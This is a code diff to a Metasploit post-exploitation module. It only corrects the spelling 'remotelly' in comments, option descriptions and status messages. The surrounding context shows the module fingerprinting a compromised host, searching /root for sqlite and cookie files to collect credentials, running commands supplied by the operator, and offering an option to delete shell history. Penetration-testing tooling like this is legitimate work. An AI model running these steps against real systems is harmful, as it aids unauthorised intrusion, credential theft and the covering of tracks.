@@ -136,7 +136,7 @@ class MetasploitModule < Msf::Post
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target?', false]),
                                 OptBool.new('DEL_SHELL_HISTORY', [false, 'Delete remote shell history commands?', false]),
-                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotelly'])
+                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotely'])
                         ], self.class)
  
         end
@@ -200,10 +200,10 @@ def run
       # Dump system information from target (fingerprints)
       #
       data_dump=''
-      print_status("Executing list of commands remotelly ..")
+      print_status("Executing list of commands remotely ..")
       Rex::sleep(0.5)
       #
-      # bash commands to be executed remotelly ..
+      # bash commands to be executed remotely ..
       #
       date_out = cmd_exec("date")
       file_sys = cmd_exec("df -H")
@@ -282,7 +282,7 @@ def run
           print_status("Running agressive fingerprint modules ..")
           Rex::sleep(0.5)
           #
-          # bash commands to be executed remotelly ..
+          # bash commands to be executed remotely ..
           #
           current_shell = cmd_exec("echo $0")
           list_drivers = cmd_exec("lspci -vv")
@@ -351,7 +351,7 @@ def run
           print_status("Dumping remote credentials from target ..")
           Rex::sleep(0.3)
           #
-          # bash commands to be executed remotelly ..
+          # bash commands to be executed remotely ..
           #
           list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
           list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
@@ -398,15 +398,15 @@ def run
 
 
         #
-        # Single_command to execute remotelly (user inputs) ..
+        # Single_command to execute remotely (user inputs) ..
         # if sellected previous in advanced options (set SINGLE_COMMAND netstat -ano) ..
         #
         exec_bash = datastore['SINGLE_COMMAND']
         # check if single_command option its configurated ..
         if not exec_bash.nil?
-          print_status("Executing user input remote bash command ..")
+          print_status("Executing user inputed bash command, remotely ..")
           Rex::sleep(0.7)
-          # bash command to be executed remotelly ..
+          # bash command to be executed remotely ..
           single_comm = cmd_exec("#{exec_bash}")
             print_status("Storing scan results into msf database ..")
             Rex::sleep(0.7)
